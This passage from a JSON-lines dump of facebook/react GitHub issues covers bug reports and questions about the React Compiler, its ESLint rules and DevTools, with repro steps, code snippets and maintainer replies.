failing](https://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wApgrAGJNKCAMoJxjAL4BKfMAA6bfHFZgCMUvgC8+KGAQAlUvzpVK8gNyr8+HblhsAPEzqYo20nuA6SWXxcTkwEPWUQEjEESPxWAGEACzI6AHNw4H4EADcEOlxFPQA+JXsHdU0CXDIYDIIDXPzcADoauoRcOzUHJhJ8fnb6lujxMEUVHoqRGKkZXH5uGBgyThGYCABbQdrh0YRx23KK4N3OlpyySigEfXwAcnvuk9ly2Ve6YoAJaUoIfAA6jhKIRXAB6DxeXDFbofEAAGhAGjo0TSKBATE22DwwVCt2A+AACtc0h4APKYZiafBBEgbTYPABGZEZ0gAtJgSR42ToyIw2RosTEYGDCEwtE9VKpBOUwWDBZgxGQqXR2BBiMh8JErpRIqogmBleLogcibVmFdXMSoKS6BSVWBirYEeAkhAAO4ASQKCBgdCuYBQ5EoxlkQA). Not sure if it's still the same in the actual \"latest\" version or this was an intermittent bug.\n\nI just tested this on HEAD in eslint-plugin-react-hooks and it's still valid. Do you happen to have an error message you can share? But yeah in any case this should all be resolved tomorrow when we cut the new release."}, {"author": "cpojer", "body": "Sorry for not being clear, I didn't mean that installing `@rc` is an issue, but that package managers will consider `6.0.0` to be newer than any tag attached to the version number, so `<package-manager> outdated` or similar will tell you to update the package.\n\nCommonly, people use ranges with their version specifier. If you install `^6.0.0-rc.2`, then ask your package manager which packages are outdated, it will tell you to upgrade to `6.0.0`. If you automatically update your deps (using `<package-manager> update` or similar), the package manager will upgrade to `^6.0.0`, so even if you want to downgrade back to `^6.0.0-rc.2`, it will stay on `6.0.0` because the lockfile in the same project will already resolve to the \"newer\" version.\n\nWhen deprecating a package version it is best to suggest to users to upgrade to a later version, not an earlier one."}, {"author": "poteto", "body": "Closing since 6.1.1 was released"}]}
{"repo": "facebook/react", "issue_number": 34680, "issue_url": "https://github.com/facebook/react/issues/34680", "issue_title": "[Compiler Bug/Discussion]: `react-hooks/preserve-manual-memoization` Questions", "issue_author": "cpojer", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [x] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEAZmgDZ4IwByEAJgmMTBBgQOQACAdgNYBeAdwD0cXAiElylGvTAA6AFZg2AbgA6XTDnwEAyngCGcHgBoCwAgDV9RngQC+TFu279hYQ8dUatuQhYAlBCIAeQAjBQQ4PDMoMAQAUSIiKJiCOIQAWQQMCFj4oKIHJ1Y2GAQjPG9NbD9zAgBzGAMsAAsAR1J8hAAFAwa0LgM8NAguADFmhowELkJHImZS8sqAWnLSAwBPIVaICB55JWrfHQsAISg8PDHixec2OTkhKDQhS+uxuTwwAA8T2pnAgAKQgYQAMmgPAB9co4MBoG4wLYAEh4CC2dyW7Ge0OhDVmlGGCFoeKEoIhULwsIQ8MRuC2ciaLQ6pG+ynUNW0-hBYMhHgAilBKJiFtjHkI8QSuESKKToeS+VShSKmc02p12QDuQQgnSkVsKfy8ABJCise6lZ56iAIg1GqlmnLs-6cjSiLgeAiiKBzAgAXgIAEYAAxumW-HV4LZYBC64IIPBwVoOjzjLgB+N4WBcAAqMYQAB4NAQCNHYxAihk+gMhiMxpN+jM5hoAHwAbTKCaTrTYAF1wwhI3V6EQDFByMRfdFRhnU3gABTAEsEcopHuFEwruG2+nIrdcezIczb7vJwoAfmPhXCkWihcKieT8-TBAAPgQuBPSK3OaWd3aDLHvONL6gyaIYpy9gAJQnhm3pjF6Fi0MMBhmK0BhgFQQ5pFC4IQAYtCDA02G-GkpAEbQpFpGuT6tMU-orqW1b9IMwyzo20yzIQha8pSgrCvufHGqBu4GhBWytgQC5MaWjTqqyAAGslyUwTbccJVKiYByIELcNo6VsKlyRwBgwA0UDNngAAiwSDIis5gDJ8GqapPpzMeFjlggx5qCAJpzAAhH5DjGW5sCQDAnllgWvkgPoMDEX5ZijuO5CWAYpDCseX6kKQoUua50FhQQHC0T2BhhKQCALlgtEwOMdGVdVx54DAwpmO0glbFQBgzHF84qsifmwcuhWuQQaC0BoJWlgoYJOSQMAeMeKLuWkBhEBQUUEGtEW4LBHAejKM5jAu6JbANSowvNYRgCNcETRNJIEowY1PU9XB0HG70fU9U0zeNf2lk8cgGXuhrXaa5rQrds2ufY8OlojQOqSjH3o65ikHhNAEQzjcnQeGpYel6a6ZhkhQLuV57BETK4ZEkKTRAuC6wf6Um-aWaBFNTwRyHAsDlHMo3GWuAtC9xEswMLhCBjTrR-nJmP2GY7YK2YCuFH29NcCupOELdjCBhk2S5M5qlswGUkoYYigLRecgvQwjuSNtC5u9I31gNBBOlu2tsGPbd2O87YB9gTuuntmMAZhbcmFtYnh2A0LT+sAQYAEz2K2xmFq0AAs3qbGAWF9QgjEgBQZGrKQDTEGMeCrPEGBoGEECkNNIC56jBCFkQYSELIcCVxSjCtBUtCkIMCB+a2Y+FhIg89xNi+FyvrmJzYxiNGnGfZxvE3AEbjvVVwDR4PRF7SfDRtyBgLSsxYX30Met0OGYgz0L87NSfHwMPlpGJBk84nQYCRnJJaHh05fyHAGf0gYQyY2BqWC66dbpyCmsglBeN7RgnQWCbBH0hCHyetBYqvdYLHn-k9QsYAsAGAzHAEuZcZiV0RJlNAcAyw4VWMyLYqwACsIYQxzwgf3QeBBh6VxoAQI2n5vwEA8MSOeuYJ7lAIGZOMX05ELTLBAJRewBByEXgPPApDV5CHoYwixhMiFyWABhLCOECAADJXE317qWQs287CIDmJQWxq8Pg3D1l41yYwADC09jDpythzR6KDVI82koFPClFiLUVFuEj6FFCLUQXOtXWSS0YQORvYj6AA3MyaBGF4ErtAPA08ZR+QgUE2hZipEMBHn5EJtwbiGIgAIAguRyhz10EYkZYhTHL3Ee8K4oT2neKEL49p0F7GLyTrYUhmzVkrl1ijEAJgQAehIA0FA6BASEG8vUHoWVawhCwPWT0WIHhhEqggUgqwsD3MGOsCo0RViiGwGQSgQgiIeGqBoJcK4hAiBYFgMg7ExiZG+nFTKpBWmHiUexMAJAGAED6PgWppBCx3KgA8p5jlWxEyOeAIxAVtpDFIGAFAY4WUIHsEAA\n\n### Repro steps\n\n*I'm not sure if question or bug.*\n\nI upgraded to the latest version of `eslint-plugin-react-hooks`, enabled every compiler lint rule, and got 150+ errors in a reasonably sized codebase related to `react-hooks/preserve-manual-memoization`. The attached playground link comes from a smaller project with idiomatic React/Relay code where I saw similar issues.\n\nI roughly understand that the compiler can do a little bit better than me in this example, but I still prefer writing `useCallback`/`useMemo` in case I need to disable the compiler. I prefer manual control over memoization, and deferring \"the rest\" to the compiler. I realize that's subjective, so this is more of a question of whether this rule will be on by default in the recommended config in `eslint-plugin-react-hooks`? If yes, will it be a warning or an error?\n\nDepending on the answer, I would like to ask if it's possible to change the name, title and explanation of this lint rule to something more approachable. Right now it says:\n\n**`react-hooks/preserve-manual-memoization`**\n> Compilation Skipped: Existing memoization could not be preserved\n> React Compiler has skipped optimizing this component because the existing manual memoization could not be preserved. This value was memoized in source but not in compilation output.\n\nThe wording is imho quite confusing. The compiler is telling me I did something wrong, and is giving me no hints about what that might be. How about this:\n\n**`react-hooks/unnecessary-manual-memoization`**\n> Compilation Skipped: Unnecessary manual memoization\n> React Compiler has skipped optimizing this component because the manual memoization is weaker than React Compiler's memoization. Remove the `useMemo` call and embed the result directly in your render function.\n\n\nMy final question is: if you can detect that React Compiler can do a better than me, couldn't you wrap my memoization with some compiler magic and get rid of this lint rule?\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.2.0.\n\n### What version of React Compiler are you using?\n\nI don't know, latest.", "issue_labels": ["Type: Question", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting. As background, see my answer at https://github.com/facebook/react/issues/34172#issuecomment-3211280685 for why the compiler works as it does. In your example, the compiler doesn\u2019t know the type of `jobs` and assumes it\u2019s an arbitrary mutable value, such that the later `jobs.map(\u2026)` could be mutating that value. In other words, it isn\u2019t that the compiler can do \u201cbetter\u201d than the developer, it\u2019s that the compiler isn\u2019t sure if the manual memoization is safe or not. \n\nThere is also some discussion of this at https://github.com/facebook/react/issues/34289\n\nAs I mentioned in the latter - this is an area with difficult tradeoffs and no best answer. We are continuing to evaluate whether to change the compiler to treat existing manual memoization as an input to compilation. A downside is that it would then become a breaking change to remove manual memoization."}, {"author": "josephsavona", "body": "Hey @cpojer, as I noted above we've been exploring this tradeoff for some time. As of yesterday we're confident enough in the new mode to make it the default, which should address the concern here. More details at https://github.com/facebook/react/issues/34172#issuecomment-3367496138."}]}
{"repo": "facebook/react", "issue_number": 34701, "issue_url": "https://github.com/facebook/react/issues/34701", "issue_title": "Bug: Support Zod v4 in eslint-plugin-react-hooks", "issue_author": "RampantDespair", "issue_body": "<!--\n  Please provide a clear and concise description of what the bug is. Include\n  screenshots if needed. Please test using the latest version of the relevant\n  React packages to make sure your issue has not already been fixed.\n-->\n\nReact version:\nN/A (ESLint issue)\n\n## Steps To Reproduce\n\n1. Install `eslint@9.36.0` with `eslint-plugin-react-hooks@6.1.0` in a project that also uses `zod@4.x`.\n2. Run ESLint on any file.\n3. Observe the crash.\n\n<!--\n  Your bug will get fixed much faster if we can run your code and it doesn't\n  have dependencies other than React. Issues without reproduction steps or\n  code examples may be immediately closed as not actionable.\n-->\n\nLink to code example:\n\nMinimal reproduction:\n\n```bash\nnpm init -y\nnpm i -D eslint@9.36.0 eslint-plugin-react-hooks@6.1.0 zod@4\nnpx eslint --init\nnpx eslint index.js\n```\n\n<!--\n  Please provide a CodeSandbox (https://codesandbox.io/s/new), a link to a\n  repository on GitHub, or provide a minimal code example that reproduces the\n  problem. You may provide a screenshot of the application if you think it is\n  relevant to your bug report. Here are some tips for providing a minimal\n  example: https://stackoverflow.com/help/mcve.\n-->\n\n## The current behavior\n\nESLint crashes with:\n\n```\nTypeError: zod.z.function(...).args is not a function\n    at eslint-plugin-react-hooks.development.js:32075:57\n```\n\nThis happens because `eslint-plugin-react-hooks` is written against Zod v3, where `z.function(...).args(...)` exists. In Zod v4, that API changed, so the plugin immediately fails when loaded.\n\n## The expected behavior\n\n`eslint-plugin-react-hooks` should work with Zod v4, or at least specify a peer dependency constraint to prevent incompatible installs. Ideally the schema validation should be updated to use Zod v4\u2019s function API.\n", "issue_labels": ["Type: Bug", "Component: React Compiler", "Component: ESLint Rules"], "comments": [{"author": "josephsavona", "body": "Thanks for posting, this was addressed in #34717 and included in 6.1.1. Please feel free to reopen if this is still an issue!"}]}
{"repo": "facebook/react", "issue_number": 31407, "issue_url": "https://github.com/facebook/react/issues/31407", "issue_title": "[Compiler Bug]: `'Unused 'use no memo' directive'` lint warning even though the directive is used", "issue_author": "jthemphill", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [X] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAegFQYDoDsAEG+AKgBYCWY+l+Y5AtuQDYCGM+ALhPlGAgMocWHBABp8AIygdqMlkyYQA7lQDmCDh3K5VnUgnysRYGSeEGEANwS48hSQgBmEGAY77aQkflIsqEhBseAAcAE3NQyQBPfFcWOA4AOjsMNDwEAA9glxlHKFwE8ggCXgEogsFzAAptci15AEp8YDt8AHJS-FxuegR6CDbWuGKTfABtcT4OADV5KAQAXXwAXh4+SpEa3DryRoBuIZGZV0cVtYQAJSctnf3W1w5YAjHW-HwqpuWAPlinRLhYK5cBxRK93pY5ghPj8WgQ3vDyKcqid-oCbDIAITLVYQpjzJqw+FE36OVEwIEyHGQg5w4m0DSzPEIKq4-E0ukAXzBHNBcIWNK5tlwmBwBCIAEEfBAIABrTjcGWBYKcGDxOUQU7uCyhOosCRMAxmbwavQGbTBaTJMX4AByEG87mE+CUBlwgUiXB8LFwoQN+BY+GGUGCfpNCFC6kDfgQYGQKXwAEZEoGIPRGDJ6CwYgEowpw9QCFraCxer8fQh2IoIMq-CFwiIAKI6maQ+MAJmTwfrCCbdUZ83wmezBjg8gNkRYjhE7GGabq1Coo7zoXjZBjBjYBlCA89Rcc8RkjpkNqg9ACMAAkrgLTJpMxyAAvGOyKjKAhGhAAWgk0ZX1tZBhduYVDepEs7pgW+AuKEFbyvgwQVs4MD0Cm5IIAk+BIZmmjaKoVqEGkbpZDkmH5IUxTnL2Qj6syhJQbgADCvg6GIrTFAAQniMC8m8cShAA8rgTAxKs+5MHwPH4ABknFEx3rqFeN79qxcKyd6iBMJJMH7lATAcFRuFnGJEl4ByBKtB0fBdD0fQDIcuCjGM6gtky7EILhVHhpMDKQm5HnNuGSyrKU-DlHAGzMmC2ksLp+nNoZAD8zRSZC+AcvgyBdLpmmtA0NL2aM4HzqsHwrDCYLDA5MgAX5OieZEqzOcptWqPVHzsgiSI1e5dUBZEWKrLg2X4AAZCNKWuT1rV9YkAH4ANE34s0YJvLJzHqAliQsr5U31bNkJ5dyYJTM1u19VUQ0KIdtL0ZxsCbe1rQcvlcKVYV6kIEwZyld8y03SdO3+XU4YXdl11Emt8kIIp0jKQ9AHg-CakFJ9D2I6tuB3TAaMdc9eAFTI6IVlREXfdCf1Eoi7wYnxgnCeZN1vADk1AyIoRVMAi0GGZHVvIKfMvW8b23mE5hUcp31ukoynk3RGNySxMMufMD1SzLvMplVXMtfVZxNYDvXA+z6PUF1BvTUbo3jd1rPhvtTLzdiXQINLB0U8SzPzDr52cwBmVq6lPPcvgn1WXL8JoGgJAUFQNCOOQrgTlOsFFSCtDcPOYCkNATCRKo3AmKq5CqKQh7cJDLErfgkf4AA6huYBgKebi+DI85KMwX1utY7A5vHicOEhFjAsTzYReI2cuj3+HEhXG1bQHTIm-zaWC5row24bbN6z5LNbyDiMPE87tvH72tnZbSWbxbbP2wOmXSWClAGToD-m7rC2XV9Y3zbTQlRJJIWqZ0yAKjCjHKN0iYwBJl4FSRIgKNmbMpSSgpBQgA5EAA\n\n### Repro steps\n\n`useSyncState` and `useEditable` break when the React Compiler runs on it. So I added `'use no memo'` to the top of `useSyncState` and `useEditable`. In both these places, `eslint-plugin-react-compiler` reports that the `'use no memo'` directive is unused. Even though this directive is the only difference between a passing E2E test and a failing one!\r\n\r\n<img width=\"561\" alt=\"image\" src=\"https://github.com/user-attachments/assets/fa72f31a-2d00-4d2a-8f90-b39db1c69185\">\r\n\r\n* Related to https://github.com/facebook/react/issues/31406, where I report that the compiler should ideally bail out on these hooks so the `'use no memo'` directive becomes unnecessary.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n18.3.1\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-6fc168f-20241025", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "dohomi", "body": "What is the right use of react-compiler directive? I also see following issue in latest eslint plugin\n\n```\n//     \"eslint-plugin-react-compiler\": \"^19.1.0-rc.2\",\nUnused 'use no memo' directive  react-compiler/react-compiler\n```"}]}
{"repo": "facebook/react", "issue_number": 33052, "issue_url": "https://github.com/facebook/react/issues/33052", "issue_title": "[Compiler Bug]: TypeError: isUndefined is not a function (it is undefined)", "issue_author": "Robert27", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://github.com/Robert27/react-compiler-repro\n\n### Repro steps\n\nThis bug happens in my Expo app and only with the [calendar lib](https://github.com/howljs/react-native-calendar-kit).\nThe repro repo uses the react compiler version expo recommends, but it also happens with React 19.1 with the latest React compiler alpha version.\n\n1. Navigate to `Calendar` tab.\n2. Error: `TypeError: isUndefined is not a function (it is undefined)`\n\nThe only workaround is to completely disable the compiler. Using `'use no memo'` or disabling the file in the babel config does not work.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.0\n\n### What version of React Compiler are you using?\n\n19.0.0-beta-af1b7da-20250417", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: React Compiler"], "comments": [{"author": "Robert27", "body": "After further investigation, I found that the React compiler appears to drop the imported utility files of Luxon when using the default entry point. However, switching the import field in Luxon\u2019s package.json to use the ES6 build (./build/es6/luxon.js) resolves this issue and works correctly with React Native and the new React compiler.\n\nHere is the patch I applied to Luxon\u2019s package.json exports:\n\n```json\n\"exports\": {\n  \".\": {\n-    \"import\": \"./src/luxon.js\",\n+    \"import\": \"./build/es6/luxon.js\",\n    \"require\": \"./build/node/luxon.js\"\n  }\n}\n```\nThis suggests that the React compiler expects the ES6 module build for proper tree-shaking and import handling. It would be great if Luxon could officially support this configuration to improve compatibility with React Native and React\u2019s latest compiler.\n\nSince this is related to how React handles module resolution, should I keep this issue open here or would it be better to coordinate with the Luxon maintainers to update their package configuration?"}, {"author": "veliseev93", "body": "Any updates?"}, {"author": "josephsavona", "body": "I\u2019m pretty sure this is an issue with an earlier version of Expo. When you enable React Compiler, that also causes Expo to use a different build mode which had a bug w circular dependencies (leading to the undefined error). I believe that issue has been fixed, can you try on latest Expo?"}, {"author": "Shonferns004", "body": "Hello! \ud83d\udc4b I came across issue and would love to work on this. I\u2019ve set up the repo locally and started digging into it.\n\nJust wanted to check in before starting \u2014 is anyone already working on this? If not, I\u2019d love to take it up.\n\nThanks!"}, {"author": "steve4835", "body": "I am on the latest version of expo, and am getting this error as well.\n"}, {"author": "Robert27", "body": "The broken export has been fixed in `luxon@3.7.2`. I'll now close this issue, as it is not directly related to React."}]}
{"repo": "facebook/react", "issue_number": 34418, "issue_url": "https://github.com/facebook/react/issues/34418", "issue_title": "[Compiler Bug]: Modifying a value returned from a hook is not allowed.", "issue_author": "Zhangjun-Hex", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhASwLYAcIwC4AEwBUYCAyngIZ4IEC+BAZjBBgQOQwJVx4cBuADoA7TDnxESZAIJYsAETRgsNOAAsGzVuw4A6PQHoDhsHlwJD6iBADWYQaPG5CxMABs0iLSzacTJmYWpp6IjiKiCAAeEoQAJghMVFDuhExQInxoECIEAGJo7ghgABQAlESiBARwOWYEccqqeBoEALzSCHKKTWrq5cK5NXWEANpmNAgANARkeJSTALrtnQu0JQAMZYNVBNx4sLklu9UAPI0AbgB8J9UEp2giWFB4t3cEeACeWAhtQiBMQoIf5vO45ADC6ioIgA5r9gCUEBcECI8BU2ldKkN3u80EwCIjkai9NQYHC8HpAUUwAB+PRFWF4dQVYCgnENXotfoeLwIPS8PDZERgPRzApFAAqEAAqlh3BAqHESqMDHokSiKaTyZSgWBFmVtmycYZDAQ8SRMmwMBqEHEPuplARPCJpgQRBBhtggTACAgYKwYGAje8TbMEPNqOsSmB0ZiwAQANQEFUGdXErXhnXUxb0lEwpmG7Hsu5pzVUMmZi5UdxQOgdDjhYt3ehG+gtovvDApQVy4EdgiGG5F06GS5D6qF9sgKYgWoiQEwlAgED0IA\n\n### Repro steps\n\n```js\nimport { useState } from 'react';\nimport { useAppDispatch } from '../../store/hooks';\nimport { slice } from '../../store/slice';\n\nexport default function Files() {\n  const dispatch = useAppDispatch();\n  const [state, setState] = useState(0);\n\n  return (\n    <div>\n      <input\n        type=\"file\"\n        onChange={(event) => {\n          if (event.target.files?.length) {\n            dispatch(slice.actions.setFileToUpload([...event.target.files]));\n            // if uncommented this line, no compiler errors\n            // setState((s) => s + [...event.target.files].length);\n            event.target.value = '';\n          }\n        }}\n        multiple\n      />\n    </div>\n  );\n}\n```\n\nFound 1 error:\n\nError: This value cannot be modified\n\nModifying a value returned from a hook is not allowed. Consider moving the modification into the hook where the value is constructed.\n\n```\n  16 |             // if uncommented this line, no compiler errors\n  17 |             // setState((s) => s + [...event.target.files].length);\n> 18 |             event.target.value = '';\n     |             ^^^^^^^^^^^^ `dispatch` cannot be modified\n  19 |           }\n  20 |         }}\n  21 |         multiple\n```\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19.1.1\n\n### What version of React Compiler are you using?\n\n19.1.0-rc.3", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting, that's a bug. We'll take a look!"}, {"author": "ajinkya22-dev", "body": "@josephsavona Can I work on this bug? "}, {"author": "josephsavona", "body": "@ajinkya22-dev I appreciate the interest but this is a pretty subtle compiler change, i'll take a look"}, {"author": "josephsavona", "body": "Fix landed!"}]}
{"repo": "facebook/react", "issue_number": 34108, "issue_url": "https://github.com/facebook/react/issues/34108", "issue_title": "[Compiler Bug]: Compiler introduces unnecessary breaks that skips its own memoization", "issue_author": "refparo", "issue_body": "### What kind of issue is this?\n\n- [x] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [ ] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nhttps://playground.react.dev/#N4Igzg9grgTgxgUxALhAgHgBwjALgAgBMEAzAQygBsCSoA7OXASwjvwFkBPAQU0wApg+XJ0wJ8AXwCU+YAB02+OKzAEAtgjUQmALwSF8AXnxQwCdpoj9+MwwD5ZC-M6UqCANzKUo44xjF0YEzuCDYA3E4uTCT4-CJiRobGcuAAFji4APq4CDBqKTLyii74MAi4sGye3ggRxZL4CJRmjvXO1T4AdGpQuGQ54ZElZRUwVV4+dSUSkRIANPgA2vEIALpSU6XllfgAPITBdgASTZQQ+ADqOJQGwBpauvoSuwD0B+52dTN0IBJAA\n\n(Update: made the repro shorter and more generic)\n\n### Repro steps\n\n1. See the playground link.\n2. Look at the two `break`s the compiler introduced in the output. The memoization is skipped by the two `break`s, making the result of `useMemo` always new in each render.\n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\nBoth 18.3.1 and the version used by Playground\n\n### What version of React Compiler are you using?\n\nBoth 19.1.0-rc.2 and the version used by Playground", "issue_labels": ["Type: Bug", "Component: React Compiler"], "comments": [{"author": "josephsavona", "body": "Thanks for posting, that\u2019s definitely a bug. We\u2019ll take a look!"}, {"author": "Shonferns004", "body": "Hello! \ud83d\udc4b I came across issue and would love to work on this. I\u2019ve set up the repo locally and started digging into it.\n\nJust wanted to check in before starting \u2014 is anyone already working on this? If not, I\u2019d love to take it up.\n\nThanks!"}]}
{"repo": "facebook/react", "issue_number": 31135, "issue_url": "https://github.com/facebook/react/issues/31135", "issue_title": "[DevTools Bug]: stuck at loading react element tree", "issue_author": "Arichy", "issue_body": "### Website or app\n\nN/A\n\n### Repro steps\n\n1. It's my local react app.\r\n2. added `<script src=\"http://localhost:8097\"></script>` at the beginning of `head` tag in `index.html`\r\n3. run `react-devtools` in terminal\r\n\r\n<img width=\"800\" alt=\"image\" src=\"https://github.com/user-attachments/assets/b6eb23f7-8036-4c61-983d-ce2bf858f704\">\r\n\n\n### How often does this bug happen?\n\nEvery time\n\n### DevTools package (automated)\n\n_No response_\n\n### DevTools version (automated)\n\n_No response_\n\n### Error message (automated)\n\n_No response_\n\n### Error call stack (automated)\n\n_No response_\n\n### Error component stack (automated)\n\n_No response_\n\n### GitHub query string (automated)\n\n_No response_", "issue_labels": ["Type: Bug", "Status: Unconfirmed", "Component: Developer Tools"], "comments": [{"author": "hoxyq", "body": "Thanks for reporting this. This has been fixed in https://github.com/facebook/react/pull/31102 and will be out with 6.0.1 soon"}, {"author": "Ario99", "body": "I started this issue yesterday. It's still persistent despite following the troubleshooting instruction to cycle toggle the react dev tools plugin. Allowing file links didn't help either."}, {"author": "limitedmage", "body": "I am seeing the same issue too @hoxyq on version 6.1.5"}]}
{"repo": "facebook/react", "issue_number": 31330, "issue_url": "https://github.com/facebook/react/issues/31330", "issue_title": "[Compiler]: Ref values (the `current` property) may not be accessed during render. (eslint)", "issue_author": "zigang93", "issue_body": "### What kind of issue is this?\n\n- [ ] React Compiler core (the JS output is incorrect, or your app works incorrectly after optimization)\n- [ ] babel-plugin-react-compiler (build issue installing or using the Babel plugin)\n- [X] eslint-plugin-react-compiler (build issue installing or using the eslint plugin)\n- [ ] react-compiler-healthcheck (build issue installing or using the healthcheck script)\n\n### Link to repro\n\nno\n\n### Repro steps\n\n```tsx\r\nimport { useEffect, useRef } from 'react'\r\n\r\ntype TOptional<T> = T | undefined\r\n\r\nexport function usePrevious<T>(value: T): TOptional<T> {\r\n  const ref = useRef<TOptional<T>>()\r\n  useEffect(() => {\r\n    ref.current = value\r\n  }, [value])\r\n  return ref.current // error here.. \r\n}\r\n\r\n```\r\n\r\nWhat's wrong with this usePrevious hook ? \n\n### How often does this bug happen?\n\nEvery time\n\n### What version of React are you using?\n\n19 beta\n\n### What version of React Compiler are you using?\n\nbeta", "issue_labels": ["Type: Question", "Component: React Compiler"], "comments": [{"author": "poteto", "body": "Returning `ref.current` breaks a rule of React since any consumer of `usePrevious` would be accessing the ref during render."}, {"author": "josephsavona", "body": "As @poteto mentioned, this is a legitimate error in that it accesses a ref during render. It also doesn\u2019t actually always return the previous value!\r\n\r\nTo implement this pattern correctly - safely returning the previous value - you could use the following:\r\n\r\n```js\r\nfunction usePrevious(value: T): T {\r\n  const [previous, setPrevious] = useState(value);\r\n  const [current, setCurrent] = useState(value);\r\n  let result = previous;\r\n  if (value !== current) {\r\n    setPrevious(current);\r\n    setCurrent(value);\r\n    result = current;\r\n  }\r\n  return result;\r\n}\r\n```"}, {"author": "zigang93", "body": "> As @poteto mentioned, this is a legitimate error in that it accesses a ref during render. It also doesn\u2019t actually always return the previous value!\r\n> \r\n> To implement this pattern correctly - safely returning the previous value - you could use the following:\r\n> \r\n> ```js\r\n> function usePrevious(value: T): T {\r\n>   const [previous, setPrevious] = useState(value);\r\n>   const [current, setCurrent] = useState(value);\r\n>   let result = previous;\r\n>   if (value !== current) {\r\n>     setPrevious(current);\r\n>     setCurrent(value);\r\n>     result = current;\r\n>   }\r\n>   return result;\r\n> }\r\n> ```\r\n\r\nWe use a ref to hold the previous value because refs don't cause a re-render when their value updates. This differs from state variables, which do cause a re-render when changed. Since we want to avoid re-rendering when the previous value changes, refs are ideal for this purpose.\r\n\r\nI did solve it by just changed to:\r\n\r\n```tsx\r\nexport function usePrevious<T>(value: T)  {\r\n  const ref = useRef<T>()\r\n  useEffect(() => {\r\n    ref.current = value\r\n  }, [value])\r\n  return ref?.current // this silent the error\r\n}\r\n```\r\ncredit to this post when I was try to refer `usePrevious`:  https://www.dhiwise.com/post/supercharging-your-react-components-with-the-useprevious-hooks.\r\n\r\nP/S: I had tried your `useState` solution, it cause infinity loop and crash my app due to too many re-render.\r\n\r\n---\r\n\r\n_\"It also doesn\u2019t actually always return the previous value!\"_ \r\n\r\nbut I can sure that I able to get previous value from init. I am not sure that this behaviour will be changed when update to react 19 stable. \r\n\r\n\r\n"}, {"author": "josephsavona", "body": "> I did solve it by just changed to:\r\n\r\nYeah, this is still unsafe and likely to miss updates. It's still reading from the ref during render, without anything to ensure that the value actually updates.\r\n\r\n> P/S: I had tried your useState solution, it cause infinity loop and crash my app due to too many re-render.\r\n\r\nThis is another indication that what you're doing is a bit tricky. The only reason you'd get too many re-renders is if the input value is constantly changing. But if the input value is constantly changing, then what does \"using the previous value\" even mean? It would just be whatever value you happened to render with, and not indicate any kind of meaningful semantic change.\r\n\r\nIt would really help to step back and understand what exactly you're trying to achieve with `usePrevious`. What are you trying to do? More context would help."}, {"author": "mpressmar", "body": "We are also using this usePrevious hook implementation frequently. The purpose of its returned value is not to be accessed during render but within a `useEffect` hook for a more fine-grained control of how to react to which changes.\r\n\r\nAs an example, let's say a useEffect should perform logic only when an entry has been pushed into an array:\r\n\r\n```\r\n    const previousList = usePrevious(list);\r\n    useEffect(() => {\r\n        if (previousList && previousList.length < list.length) {\r\n            // ...\r\n        }\r\n    }, [previousList, list]);\r\n```\r\n\r\nThe hook is also useful when a hook has other variables as dependencies but should react differently to their changes or ignore their changes overall (while still using their most recent version). For example:\r\n\r\n```\r\n    const previousA = usePrevious(a);\r\n    const previousB = usePrevious(b);\r\n    useEffect(() => {\r\n        if (a !== previousA) {\r\n            onUpdateA(a, b);\r\n        }\r\n       if (b !== previousB) {\r\n           onUpdateB(a, b);\r\n       }\r\n    }, [a, previousA, b, previousB, onUpdateA, onUpdateB]);\r\n```\r\n\r\n\r\nBoth of the usages I mentioned above can be expressed differently with a `useRef` but imho with worse readability."}, {"author": "Lonli-Lokli", "body": "Is there safe implementation for [useIsFirstRender](https://github.com/antonioru/beautiful-react-hooks/blob/master/src/useIsFirstRender.ts)? \r\n\r\nThis is so strange that React is forcing everyone to change their code for no reason... Without moving React closer to what devs wants"}, {"author": "poteto", "body": "Just to be clear, it is [not necessary](https://react.dev/learn/react-compiler#what-does-the-compiler-do) for the compiler to compile every single component/hook before 